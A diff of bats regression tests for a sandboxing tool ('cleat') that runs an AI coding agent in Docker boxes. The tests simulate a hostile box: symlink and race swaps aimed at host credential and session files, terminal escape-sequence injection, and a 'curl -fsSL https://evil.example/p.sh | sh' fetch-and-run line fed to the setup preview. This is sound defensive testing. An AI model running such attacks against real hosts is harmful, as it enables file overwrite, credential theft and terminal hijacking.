+      */.host-ready) rm -f "$1" 2>/dev/null; ln -s "$_HR154_TARGET" "$1" ;;
+      *) if [ -L "$1" ]; then rm -f "$1"; fi ;;
+    esac
+    return 0
+  }
+  _clipboard_watcher "$clip_dir" "cat > /dev/null" test-hr154 >/dev/null 2>&1 &
+  local pid=$! i
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    [ -e "$target" ] && break
+    grep -q '/tmp/cleat-clip/.host-ready$' "$DOCKER_CALLS" 2>/dev/null && break
+    sleep 0.3
+  done
+  stop_watcher "$pid" "$clip_dir"
+  run test -e "$target"
+  assert_failure
+}
+
+@test "regression v1.5.4: the clipboard bridge claimed inside the box mount when clipclaim was unusable" {
+  # With no host-only clipclaim/ the watcher fell back to claiming inside the
+  # clip dir, which the box has read-write. The claim, the cap temp and the
+  # read that pipes it to the host clipboard then sat on names the box can list
+  # and plant. A regular file at clipclaim makes the mkdir fail, even as root.
+  # The bridge is off for the session instead: nothing is claimed, readiness is
+  # never announced, and this session's marker and a stale .host-ready go, so
+  # the box's shim takes its OSC 52 path.
+  use_docker_stub
+  local clip="$TEST_TEMP/cf/clip" watch
+  mkdir -p "$clip"
+  : > "$TEST_TEMP/cf/clipclaim"
+  watch="$(_clip_watch_dir "$clip")"
+  mkdir -p "$watch"
+  # The marker exec_claude writes before it starts the watcher. $$ inside the
+  # backgrounded watcher is this shell's pid, so this is the session's name.
+  : > "$watch/.watcher.$$"
+  : > "$clip/.host-ready"
+  # A fresh copy, delivered the way the shim does it. The startup sweep keeps
+  # it, so a watcher that claims anything would claim this.
+  echo payload > "$clip/.clipboard.t"
+  mv "$clip/.clipboard.t" "$clip/clipboard"
+  _clipboard_watcher "$clip" "cat > '$TEST_TEMP/cf-copied'" test-cf154 > "$TEST_TEMP/cf-wlog" 2>&1 &
+  local pid=$!
+  if ! process_exited "$pid"; then
+    stop_watcher "$pid" "$clip"
+    fail "REGRESSION: the clipboard watcher kept running with no host-only claim dir"
+  fi
+  wait "$pid" 2>/dev/null || true
+  run test -e "$TEST_TEMP/cf-copied"
+  assert_failure
+  run test -f "$clip/clipboard"
+  assert_success
+  run test -e "$clip/.host-ready"
+  assert_failure
+  run test -e "$watch/.watcher.$$"
+  assert_failure
+  run grep -c '/tmp/cleat-clip/.host-ready$' "$DOCKER_CALLS"
+  assert_output "0"
+  run cat "$TEST_TEMP/cf-wlog"
+  assert_output --partial "clipboard bridge off this session"
+}
+
+@test "regression v1.5.4: the browser bridge claimed inside the box mount when clipclaim was unusable" {
+  # The same fallback in the browser watcher: the URL was claimed inside the
+  # clip dir and the minute ledger was skipped. always mode takes the
+  # destination gate out of the way, so a claim made in the mount would open.
+  local clip="$TEST_TEMP/bf/clip"
+  mkdir -p "$clip"
+  : > "$TEST_TEMP/bf/clipclaim"
+  cat > "$TEST_TEMP/fake_open" <<OPEN
+#!/usr/bin/env bash
+echo "\$1" >> "$TEST_TEMP/opened.log"
+OPEN
+  chmod +x "$TEST_TEMP/fake_open"
+  printf '%s' "https://x.example/fallback" > "$clip/.browser-open"
+  _browser_watcher "$clip" "$TEST_TEMP/fake_open" "" "always" "0" > "$TEST_TEMP/bf-wlog" 2>&1 &
+  local pid=$! exited=0
+  process_exited "$pid" && exited=1
+  kill "$pid" 2>/dev/null || true
+  wait "$pid" 2>/dev/null || true
+  [ ! -e "$TEST_TEMP/opened.log" ] || fail "REGRESSION: a URL claimed inside the mount was opened"
+  run test -f "$clip/.browser-open"
+  assert_success
+  run test -e "$clip/.opens"
+  assert_failure
+  [ "$exited" = 1 ] || fail "REGRESSION: the browser watcher kept running with no host-only claim dir"
+  run cat "$TEST_TEMP/bf-wlog"
+  assert_output --partial "browser bridge off this session"
+}
+
+# A session for the rename regressions below, in a key dir under the isolated
+# HOME. No ps_output is written, so Docker answers that the box is not running
+# unless a test says otherwise.
+_c12_session() {
+  C12_SDIR="$HOME/.claude/projects/proj-c12"
+  C12_U="11111111-2222-4333-8444-555555555555"
+  mkdir -p "$C12_SDIR"
+  printf '{"type":"user","message":{"role":"user","content":"hi"},"sessionId":"%s"}\n' "$C12_U" > "$C12_SDIR/$C12_U.jsonl"
+}
+
+@test "regression v1.5.4: a rename never writes the sidecar through a linked session folder" {
+  # The session dir is the box's own tree, mounted read-write, so the box can
+  # leave <uuid> behind as a link to any host directory. mkdir -p, the -d test,
+  # mktemp and mv all followed it and custom-title.json landed in that host
+  # directory. No race needed: the link outlives the box.
+  _daemon_up() { return 0; }
+  container_exists() { return 1; }
+  _c12_session
+  mkdir -p "$TEST_TEMP/hostdir"
+  ln -s "$TEST_TEMP/hostdir" "$C12_SDIR/$C12_U"
+  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x pwned
+  assert_failure
+  run ls -A "$TEST_TEMP/hostdir"
+  assert_output ""
+  # Every check runs before the first write, so the transcript is untouched too.
+  run grep -c custom-title "$C12_SDIR/$C12_U.jsonl"
+  assert_output "0"
+}
+
+@test "regression v1.5.4: a rename never moves the sidecar into a folder linked at custom-title.json" {
+  # mv onto a link to a directory moves the temp INTO that directory, so the
+  # box could park .custom-title.json.XXXXXX in any host directory the user can
+  # write by planting custom-title.json as a link.
+  _daemon_up() { return 0; }
+  container_exists() { return 1; }
+  _c12_session
+  mkdir -p "$C12_SDIR/$C12_U" "$TEST_TEMP/hostdir"
+  ln -s "$TEST_TEMP/hostdir" "$C12_SDIR/$C12_U/custom-title.json"
+  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x pwned
+  assert_failure
+  run ls -A "$TEST_TEMP/hostdir"
+  assert_output ""
+  run grep -c custom-title "$C12_SDIR/$C12_U.jsonl"
+  assert_output "0"
+}
+
+@test "regression v1.5.4: a transcript swapped for a link during the title prompt is never appended to" {
+  # The containment check ran once, before the prompt, and the writer then
+  # opened the transcript by name. A box running while the user typed could
+  # swap in a link and stop, and the host appended the record to the link's
+  # target, then put its mtime back so nothing looked touched.
+  _daemon_up() { return 0; }
+  container_exists() { return 1; }
+  _is_interactive() { return 0; }
+  _c12_session
+  printf 'KEEP\n' > "$TEST_TEMP/victim"
+  touch -t 202001010101 "$TEST_TEMP/victim"
+  local before
+  before="$(_path_mtime "$TEST_TEMP/victim")"
+  # Runs after the first containment check and before the read.
+  _sessions_title_for() {
+    mv "$1/$2.jsonl" "$1/$2.jsonl.moved"
+    ln -s "$TEST_TEMP/victim" "$1/$2.jsonl"
+    echo old
+  }
+  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x "" <<< "pwned"
+  assert_failure
+  assert_output --partial "Could not write the new title"
+  run cat "$TEST_TEMP/victim"
+  assert_output "KEEP"
+  run _path_mtime "$TEST_TEMP/victim"
+  assert_output "$before"
+}
+
+@test "regression v1.5.4: a rename on a running box is written by the box, never by the host" {
+  # While the box runs it can swap any name in its session dir between a host
+  # check and the write after it, so the host no longer writes there at all.
+  # The box writes its own rename inside its own namespace.
+  _daemon_up() { return 0; }
+  mock_docker_ps cleat-x
+  mock_docker_ps_a cleat-x
+  _box_has_live_agent() { return 1; }
+  _c12_session
+  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x boxname
+  assert_success
+  run grep -c boxname "$C12_SDIR/$C12_U.jsonl"
+  assert_output "0"
+  run test -e "$C12_SDIR/$C12_U"
+  assert_failure
+  run assert_docker_exec_has "docker exec cleat-x runuser -u coder -- sh -c"
+  assert_success
+  run assert_docker_exec_has "/home/coder/.claude/projects/-workspace $C12_U boxname"
+  assert_success
+}
+
+@test "regression v1.5.4: a rename refuses when Docker cannot say whether the box is running" {
+  # "Not running" is what hands the write to the host, so a docker ps that
+  # fails must not read as it.
+  _daemon_up() { return 0; }
+  container_exists() { return 1; }
+  export DOCKER_EXIT_CODE=1
+  _c12_session
+  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x newname
+  assert_failure
+  assert_output --partial "cannot tell whether"
+  run grep -c newname "$C12_SDIR/$C12_U.jsonl"
+  assert_output "0"
+  run test -e "$C12_SDIR/$C12_U"
+  assert_failure
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: two host writers built a login in a directory a box can write and
+# then used it by name. _account_write_file_0600 made its temp beside the
+# destination, which for a staged login is the box's own read-write auth dir.
+# _seed_macos_credentials made its temp in ~/.claude, which every box mounts
+# read-write. mktemp only made the create safe: the redirect, jq and chmod 600
+# reopened the name afterwards, so a box that swapped it for a link had the host
+# write a login over any host file the user can write and chmod it 600. The
+# final `mv -f tmp dest` moved the temp INTO a directory when dest had been
+# swapped for a link to one. Both now build the file in a host-only stage dir
+# and land it with one rename that names the destination's directory.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# The box: whatever the host creates under $1 is subverted at once. A file
+# becomes a link to $C13_VICTIM and a directory gets such a link planted inside
+# it under the name the writer uses.
+_c13_box_mktemp() {
+  C13_BOXDIR="$1"
+  C13_VICTIM="$TEST_TEMP/precious-host-file"
+  printf 'DO-NOT-OVERWRITE\n' > "$C13_VICTIM"
+  chmod 644 "$C13_VICTIM"
+  mktemp() {
+    local p
+    p="$(command mktemp "$@")" || return 1
+    case "$p" in
+      "$C13_BOXDIR"/*)
+        : > "$TEST_TEMP/box.acted"
+        if [ -d "$p" ]; then
+          ln -s "$C13_VICTIM" "$p/.credentials.json"
+        else
+          rm -f "$p"
+          ln -s "$C13_VICTIM" "$p"
+        fi ;;
+    esac
+    printf '%s\n' "$p"
+  }
+}
+
+_c13_mode() {
+  stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1"
+}
+
+@test "regression v1.5.4: an attach never writes a login through a link the box swaps in for the staging temp" {
+  _acct_race_setup
+  local CN="cleat-race-abcdef12" auth staged leg
+  auth="$CLEAT_RUN_DIR/$CN/auth"
+  staged="$auth/.credentials.json"
+  _box_account_write "$CN" a
+  _c13_box_mktemp "$auth"
+  for leg in jq nojq; do
+    [ "$leg" = nojq ] && _hide_jq
+    # Another box refreshed a since this one ran, so the attach stages.
+    _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
+    _acct_race_cred "$staged" A 1 1789028800000
+    run _account_sync_in "$CN"
+    assert_success
+    run cat "$C13_VICTIM"
+    assert_output "DO-NOT-OVERWRITE"
+    run _c13_mode "$C13_VICTIM"
+    assert_output "644"
+    run test -L "$staged"
+    assert_failure
+    run grep -c '"accessToken":"at-A2"' "$staged"
+    assert_output "1"
+  done
+}
+
+@test "regression v1.5.4: a box that swaps its staged login for a link to a directory cannot move the login out" {
+  _acct_race_setup
+  local CN="cleat-race-abcdef12" leg
+  C13_STAGED="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
+  C13_LOOT="$TEST_TEMP/loot"
+  mkdir -p "$C13_LOOT"
+  _box_account_write "$CN" a
+  # The merge runs inside the writer, after its link and directory checks and
+  # before its rename: the window a live box has.
+  eval "$(declare -f _account_cred_merge | sed '1s/^_account_cred_merge /_t_orig_merge /')"
+  _account_cred_merge() {
+    if [ ! -L "$C13_STAGED" ]; then
+      rm -f "$C13_STAGED"
+      ln -s "$C13_LOOT" "$C13_STAGED"
+      : > "$TEST_TEMP/box.swapped"
+    fi
+    _t_orig_merge "$@"
+  }
+  for leg in jq nojq; do
+    [ "$leg" = nojq ] && _hide_jq
+    rm -f "$TEST_TEMP/box.swapped"
+    _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
+    _acct_race_cred "$C13_STAGED" A 1 1789028800000
+    run _account_sync_in "$CN"
+    assert_success
+    run test -e "$TEST_TEMP/box.swapped"
+    assert_success
+    run ls -A "$C13_LOOT"
+    assert_output ""
+    run test -L "$C13_STAGED"
+    assert_failure
+    run grep -c '"accessToken":"at-A2"' "$C13_STAGED"
+    assert_output "1"
+  done
+}
+
+@test "regression v1.5.4: the macOS seed never writes the Keychain login through a link a box swaps in for its temp" {
+  _is_macos() { return 0; }
+  # seed_blob and not blob: the CLI's own `local blob` would shadow it.
+  local seed_blob='{"claudeAiOauth":{"accessToken":"sk-ant-oat01-KEYCHAIN","refreshToken":"rt","expiresAt":3000000000000}}'
+  _macos_keychain_credentials() { printf '%s' "$seed_blob"; }
+  local cred="$HOME/.claude/.credentials.json" leg
+  mkdir -p "$HOME/.claude"
+  _c13_box_mktemp "$HOME/.claude"
+  for leg in jq nojq; do
+    [ "$leg" = nojq ] && _hide_jq
+    rm -f "$cred"
+    _SEEDED_CREDS=0
+    _seed_macos_credentials
+    run cat "$C13_VICTIM"
+    assert_output "DO-NOT-OVERWRITE"
+    run _c13_mode "$C13_VICTIM"
+    assert_output "644"
+    run test -L "$cred"
+    assert_failure
+    run cat "$cred"
+    assert_output "$seed_blob"
+    assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
+  done
+}
+
+@test "regression v1.5.4: the macOS seed keeps the Keychain login in place when a box swaps the file for a link to a directory" {
+  _is_macos() { return 0; }
+  local seed_blob='{"claudeAiOauth":{"accessToken":"KC-FRESH","refreshToken":"rt-kc","expiresAt":3000000000000}}'
+  local cred="$HOME/.claude/.credentials.json" leg
+  C13_LOOT="$TEST_TEMP/loot"
+  mkdir -p "$HOME/.claude" "$C13_LOOT"
+  # The Keychain read sits between the expiry check and the rename, a wide
+  # window for a box that watches its expired file.
+  _macos_keychain_credentials() {
+    rm -f "$HOME/.claude/.credentials.json"
+    ln -s "$C13_LOOT" "$HOME/.claude/.credentials.json"
+    : > "$TEST_TEMP/box.swapped"
+    printf '%s' "$seed_blob"
+  }
+  for leg in jq nojq; do
+    [ "$leg" = nojq ] && _hide_jq
+    rm -f "$TEST_TEMP/box.swapped" "$cred"
+    printf '{"claudeAiOauth":{"accessToken":"BOX-EXPIRED","refreshToken":"rt-box","expiresAt":1000}}' > "$cred"
+    _SEEDED_CREDS=0
+    _CLEAT_NOW_S=2000000000 _seed_macos_credentials
+    run test -e "$TEST_TEMP/box.swapped"
+    assert_success
+    run ls -A "$C13_LOOT"
+    assert_output ""
+    run test -L "$cred"
+    assert_failure
+    run cat "$cred"
+    assert_output "$seed_blob"
+    assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: untrusted bytes printed raw to the host terminal. The "callback port
+# was busy" report printed its URL straight from the bridge log, where the box
+# chooses the bytes. The two sibling reports sanitize the same field. This one
+# never did, so a forged CALLBACK-UNAVAILABLE line put raw escape bytes, and
+# backslash text that echo -e turned into escapes, on the host terminal when
+# the session ended.
+# ─────────────────────────────────────────────────────────────────────────────
+@test "regression v1.5.4: a forged callback-port line in the proxy log cannot inject terminal control bytes" {
+  local log="$TEST_TEMP/proxy-log" esc bel
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  printf '[browser-watcher 12:00:00] %s x url=https://claude.ai/a%s]0;PWN%s\\e[2J\n' \
+    "$_BROWSER_NOBIND_MARK" "$esc" "$bel" > "$log"
+  run _maybe_report_nobind_opens "$log" 0
+  assert_success
+  assert_output --partial "https://claude.ai/a]0;PWN"
+  assert_output --partial '\e[2J'
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "${esc}[2J"
+}
+
+# v1.5.4: an invalid [resources] value was echoed raw through warn (echo -e).
+# The project .cleat is read with no trust gate, so a cloned repo, or a box
+# writing /workspace/.cleat, printed its own escape sequences on the next
+# create. The global-config branch had the same shape.
+@test "regression v1.5.4: an invalid resources value from a project .cleat is echoed without its control bytes" {
+  local esc bel
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  mkdir -p "$TEST_TEMP/proj" "$(dirname "$CLEAT_GLOBAL_CONFIG")"
+  printf '[resources]\nmemory = \\e]0;PWN\\a%s[2Jx\ncpus = %s]0;PWN%s\n' "$esc" "$esc" "$bel" > "$TEST_TEMP/proj/.cleat"
+  printf '[resources]\nmemory = g%s]0;GLB%s\ncpus = c%s]0;GLB%s\n' "$esc" "$bel" "$esc" "$bel" > "$CLEAT_GLOBAL_CONFIG"
+  _daemon_ncpu() { echo 4; }
+  _docker_vm_memory() { echo 0; }
+  run resolve_box_memory "$TEST_TEMP/proj" main
+  assert_output --partial "Ignoring invalid memory"
+  assert_output --partial "in global config"
+  assert_output --partial '\e]0;PWN\a'
+  assert_output --partial "g]0;GLB"
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "${esc}[2J"
+  refute_output --partial "${esc}]0;GLB"
+  run resolve_box_cpus "$TEST_TEMP/proj" main
+  assert_output --partial "Ignoring invalid cpus"
+  assert_output --partial "in global config"
+  assert_output --partial "c]0;GLB"
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "${esc}]0;GLB"
+}
+
+# v1.5.4: cleat config --list, the arrow-key editor and the text editor drew a
+# project's [resources] values raw through echo -e, invalid ones included (an
+# invalid value loads as the editor's custom pin).
+@test "regression v1.5.4: cleat config shows a project resources value without its control bytes" {
+  local esc bel hostile ncaps
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  hostile="${esc}]0;PWN${bel}"
+  ncaps="${#KNOWN_CAPS[@]}"
+  mkdir -p "$TEST_TEMP/proj"
+  printf '[resources]\nmemory = m%s\ncpus = c%s\n' "$hostile" "$hostile" > "$TEST_TEMP/proj/.cleat"
+  _config_vm_gb() { echo 8; }
+  cd "$TEST_TEMP/proj"
+  run cmd_config --project --list
+  assert_success
+  assert_output --partial "memory  m]0;PWN"
+  assert_output --partial "cpus    c]0;PWN"
+  refute_output --partial "$hostile"
+  run _config_picker_draw 0 "" "m${hostile}" "c${hostile}"
+  assert_output --partial "memory  m]0;PWN"
+  assert_output --partial "cpus    c]0;PWN"
+  refute_output --partial "$hostile"
+  run _config_picker_draw "$ncaps" "" "m${hostile}" "c${hostile}"
+  assert_output --partial "‹ m]0;PWN ›"
+  refute_output --partial "$hostile"
+  run _config_picker_draw "$(( ncaps + 1 ))" "" "m${hostile}" "c${hostile}"
+  assert_output --partial "‹ c]0;PWN ›"
+  refute_output --partial "$hostile"
+  _box_scope=""
+  run _config_picker_text "$TEST_TEMP/proj/.cleat" project "$TEST_TEMP/proj" <<< "q"
+  assert_output --partial "memory=m]0;PWN"
+  assert_output --partial "cpus=c]0;PWN"
+  refute_output --partial "$hostile"
+}
+
+# v1.5.4: [fork] exclude values were echoed raw in three of the fork-prune
+# warnings. The value comes from the project .cleat, which the repo or any
+# sibling box can write. (The root-naming warning only ever prints ".", "./" or
+# an empty value, so it needed nothing.)
+@test "regression v1.5.4: a fork exclude from a project .cleat is echoed without its control bytes" {
+  local esc bel hostile real_rm
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  hostile="${esc}]0;PWN${bel}"
+  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/elsewhere" "$TEST_TEMP/rmfail"
+  ln -s "$TEST_TEMP/elsewhere" "$TEST_TEMP/project/out"
+  printf '[fork]\nexclude = /abs%s\nexclude = out/x%s\nexclude = keep%s\n' "$hostile" "$hostile" "$hostile" > "$TEST_TEMP/project/.cleat"
+  run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/testbox"
+  assert_success
+  # Only the prune of the third exclude fails, so its warning is reached on any
+  # host and as root, without relying on permissions.
+  real_rm="$(command -v rm)"
+  cat > "$TEST_TEMP/rmfail/rm" <<EOF
+#!/bin/sh
+case "\$*" in *PWN*) exit 1 ;; esac
+exec "$real_rm" "\$@"
+EOF
+  chmod +x "$TEST_TEMP/rmfail/rm"
+  PATH="$TEST_TEMP/rmfail:$PATH" run _fork_prune_excludes "$CLEAT_FORKS_DIR/testbox" "$TEST_TEMP/project"
+  assert_output --partial "Ignoring unsafe [fork] exclude: /abs]0;PWN"
+  assert_output --partial "resolves outside the fork: out/x]0;PWN"
+  assert_output --partial "Could not prune [fork] exclude: keep]0;PWN"
+  refute_output --partial "$hostile"
+}
+
+# v1.5.4: _sessions_safe_str kept every byte from 0x80 up so UTF-8 titles
+# survive, which also kept U+0080..U+009F spelled in UTF-8: C2 9B is CSI and
+# C2 9D is OSC to xterm and VTE. Session titles and account fields reach it
+# from files the box writes. Each pair now renders as '?', in both render
+# sanitizers, and a removal can never assemble a fresh pair. Outside a UTF-8
+# locale _sanitize_repo_str still strips raw C1 bytes, for 8-bit terminals.
+@test "regression v1.5.4: a C1 control spelled in UTF-8 never survives a render sanitizer" {
+  local in want nested loc
+  in="$(printf 'T\302\2332J\302\2350;x\302\234B caf\303\251 \302\251')"
+  want="$(printf 'T?2J?0;x?B caf\303\251 \302\251')"
+  nested="$(printf 'a\302\302\233\233z')"
+  LC_ALL=""; LC_CTYPE=""
+  # Both spellings bash can be in: wide characters where the locale exists,
+  # bytes where it does not. The assertions are the same in both.
+  for loc in C.UTF-8 en_US.UTF-8; do
+    LANG="$loc"
+    run _sessions_safe_str "$in"
+    assert_output "$want"
+    run _sessions_safe_str "$nested"
+    assert_output "$(printf 'a\302?\233z')"
+    run _sanitize_repo_str "$in"
+    assert_output "$want"
+    run _sanitize_repo_str "$nested"
+    assert_output "$(printf 'a\302?\233z')"
+  done
+  LANG="C"
+  run _sessions_safe_str "$in"
+  assert_output "$want"
+  run _sanitize_repo_str "$(printf 'a\23331mb')"
+  assert_output "a31mb"
+}
+
+# v1.5.4: _sanitize_repo_str stripped 0x80-0x9f, which are UTF-8 continuation
+# bytes, then ran an unpinned sed. An em dash became a lone 0xe2, BSD sed under
+# a UTF-8 LC_CTYPE exits non-zero on that, and the [setup] consent preview on a
+# Mac showed the line as a blank row while the command still ran. GNU sed
+# printed the mangled bytes, so on Linux the line lost its em dash instead.
+@test "regression v1.5.4: a setup preview line with a typographic character is shown intact" {
+  local payload
+  mkdir -p "$TEST_TEMP/proj"
+  LC_ALL=""; LC_CTYPE=""; LANG="en_US.UTF-8"
+  payload="$(printf 'curl -fsSL https://evil.example/p.sh | sh  # see README \342\200\224\ncurl -fsSL https://evil.example/q.sh | sh  # \377\n')"
+  run _setup_trust_prompt "$TEST_TEMP/proj" "$payload" 2 <<< "n"
+  assert_output --partial "$(printf 'curl -fsSL https://evil.example/p.sh | sh  # see README \342\200\224')"
+  assert_output --partial "curl -fsSL https://evil.example/q.sh | sh"
+}
+
+# v1.5.4: the same unpinned sed, in the post-session browser reports, sits in a
+# plain assignment. Under the binary's set -euo pipefail a failing sed ended
+# exec_claude, cmd_shell and cmd_login right after the report heading, skipping
+# everything after it. The sed stand-in refuses any non-ASCII input, a superset
+# of what BSD sed refuses, so any sed on this path shows up on Linux too.
+@test "regression v1.5.4: a post-session browser report survives a non-ASCII URL under strict mode" {
+  local log="$TEST_TEMP/proxy-log" real_sed
+  mkdir -p "$TEST_TEMP/bsdsed"
+  real_sed="$(command -v sed)"
+  cat > "$TEST_TEMP/bsdsed/sed" <<EOF
+#!/bin/sh
+for a in "\$@"; do [ -f "\$a" ] && exec "$real_sed" "\$@"; done
+t="\$(mktemp)"; cat > "\$t"
+if [ -n "\$(LC_ALL=C tr -d '\000-\177' < "\$t")" ]; then
+  rm -f "\$t"; echo "sed: RE error: illegal byte sequence" >&2; exit 1
+fi
+"$real_sed" "\$@" < "\$t"; rc=\$?; rm -f "\$t"; exit \$rc
+EOF
+  chmod +x "$TEST_TEMP/bsdsed/sed"
+  printf '[browser-watcher 12:00:00] %s origin=evil.example url=https://evil.example/\342\200\224x\n' "$_BROWSER_BLOCKED_MARK" > "$log"
+  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
+  run env LC_ALL= LC_CTYPE= LANG=en_US.UTF-8 bash -c \
+    'source "$1"; PATH="$3:$PATH"; set -euo pipefail; _maybe_report_blocked_opens "$2" 0; echo REPORT-DONE' \
+    _ "$TEST_TEMP/cli_stripped" "$log" "$TEST_TEMP/bsdsed"
+  assert_success
+  assert_output --partial "$(printf 'https://evil.example/\342\200\224x')"
+  assert_output --partial "REPORT-DONE"
+}
+
+# v1.5.4: session teardown swept .clipboard.* and .claim.<pid>.* in the clip dir
+# with stderr on the terminal. Every name past the prefix is the box's. BSD rm
+# reports an operand it will not remove (a directory) raw, so on a Mac a
+# box-made directory named with an escape sequence printed it at teardown. GNU
+# rm quotes the name, so the stand-in rm below reproduces the BSD report.
+@test "regression v1.5.4: session teardown never prints a box-chosen clip-dir name raw" {
+  local clip="$CLEAT_RUN_DIR/test-td154/clip" real_rm esc bel
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  _host_clip_cmd() { echo "true"; }
+  _host_open_cmd() { echo ""; }
+  _clipboard_watcher() { :; }
+  export CLEAT_NO_CLIPBOARD_IMAGE=1
+  mkdir -p "$TEST_TEMP/shim"
+  real_rm="$(command -v rm)"
+  cat > "$TEST_TEMP/shim/rm" <<EOF
+#!/bin/sh
+rec=0
+for a in "\$@"; do case "\$a" in --) break ;; -*[rR]*) rec=1 ;; esac; done
+if [ "\$rec" = 0 ]; then
+  for a in "\$@"; do case "\$a" in -*) ;; *) [ -d "\$a" ] && printf 'rm: %s: is a directory\n' "\$a" >&2 ;; esac; done
+fi
+exec "$real_rm" "\$@"
+EOF
+  chmod +x "$TEST_TEMP/shim/rm"
+  # \$\$ inside `run exec_claude` is this shell's pid, the exact claim name the
+  # teardown sweeps.
+  mkdir -p "$clip/.clipboard.cb${esc}]0;PWN${bel}" "$clip/.claim.$$.cl${esc}]0;PWN${bel}"
+  PATH="$TEST_TEMP/shim:$PATH" run exec_claude test-td154 --dangerously-skip-permissions
+  assert_success
+  refute_output --partial "${esc}]0;PWN"
+}
+
+# v1.5.4: the fork copy and delete ran cp and rm -rf with stderr on the
+# terminal, over trees a box writes. BSD cp and rm report a failing path raw,
+# so a chmod-000 file named with an escape sequence printed it on a Mac during
+# fork start, refresh or rm. The tool's first three lines are now shown through
+# the row sanitizer, so the name of the file that failed is still there.
+# Write a BSD-style rm into $1 that fails with a raw name on any rm -rf of an
+# existing path containing one of the patterns after it, and runs the real rm
+# for everything else.
+_c14_bsd_rm() {
+  local dir="$1" real_rm pats="" p
+  shift
+  for p in "$@"; do pats="${pats:+$pats|}*\"$p\"*"; done
+  real_rm="$(command -v rm)"
+  mkdir -p "$dir"
+  cat > "$dir/rm" <<EOF
+#!/bin/sh
+case " \$* " in *" -rf "*)
+  for a in "\$@"; do
+    [ -e "\$a" ] || continue
+    case "\$a" in $pats) printf 'rm: nope/gone-NAME\033]0;PWN\007: Permission denied\n' >&2; exit 1 ;; esac
+  done ;;
+esac
+exec "$real_rm" "\$@"
+EOF
+  chmod +x "$dir/rm"
+}
+
+@test "regression v1.5.4: a failing fork copy or delete never prints a box-chosen file name raw" {
+  local esc stale
+  esc="$(printf '\033')"
+  # The staging dir's name. \$\$ inside `run` is this shell's pid.
+  stale="$CLEAT_FORKS_DIR/.tmp.$$"
+  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/bsdcp" "$TEST_TEMP/failmv"
+  echo hi > "$TEST_TEMP/project/f"
+  cat > "$TEST_TEMP/bsdcp/cp" <<'EOF'
+#!/bin/sh
+case "$1" in --version|--help) exit 1 ;; esac
+for i in 1 2 3 4 5; do printf 'cp: nope/leak%d-NAME\033]0;PWN\007: Permission denied\n' "$i" >&2; done
+exit 1
+EOF
+  printf '#!/bin/sh\nexit 1\n' > "$TEST_TEMP/failmv/mv"
+  chmod +x "$TEST_TEMP/bsdcp/cp" "$TEST_TEMP/failmv/mv"
+  _c14_bsd_rm "$TEST_TEMP/rm-tmp" "/.tmp."
+  _c14_bsd_rm "$TEST_TEMP/rm-dst" "/box3" "/.tmp."
+  _c14_bsd_rm "$TEST_TEMP/rm-tree" "/box2"
+  # The copy itself: at most three lines, each sanitized. The half-copied
+  # staging dir is then removed quietly.
+  PATH="$TEST_TEMP/bsdcp:$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box1"
+  assert_failure
+  assert_output --partial "leak3-NAME]0;PWN: Permission denied"
+  refute_output --partial "leak4-NAME"
+  refute_output --partial "gone-NAME"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # The staging dir a crashed copy left behind.
+  mkdir -p "$stale"
+  PATH="$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box1"
+  assert_failure
+  assert_output --partial "gone-NAME]0;PWN: Permission denied"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # The old copy a refresh replaces, the tree the box has been writing, and
+  # then the staging dir.
+  mkdir -p "$CLEAT_FORKS_DIR/box3"
+  PATH="$TEST_TEMP/rm-dst:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box3"
+  assert_failure
+  assert_output --partial "gone-NAME]0;PWN: Permission denied"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # A rename that fails leaves the staging dir to remove, quietly.
+  PATH="$TEST_TEMP/failmv:$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box4"
+  assert_failure
+  refute_output --partial "gone-NAME"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # cleat fork rm and prune.
+  mkdir -p "$CLEAT_FORKS_DIR/box2"
+  PATH="$TEST_TEMP/rm-tree:$PATH" run _fork_rm_tree "$CLEAT_FORKS_DIR/box2"
+  assert_failure
+  assert_output --partial "Could not delete"
+  assert_output --partial "gone-NAME]0;PWN: Permission denied"
+  refute_output --partial "${esc}]0;PWN"
+}
+
+# v1.5.4: the session trash sweep ran rm -rf on a trashed session's tree with
+# stderr on the terminal, and as its last command. Its contents are the box's,
+# so a BSD rm failure printed a box-chosen name raw, and the non-zero status
+# ended `cleat sessions` under set -e.
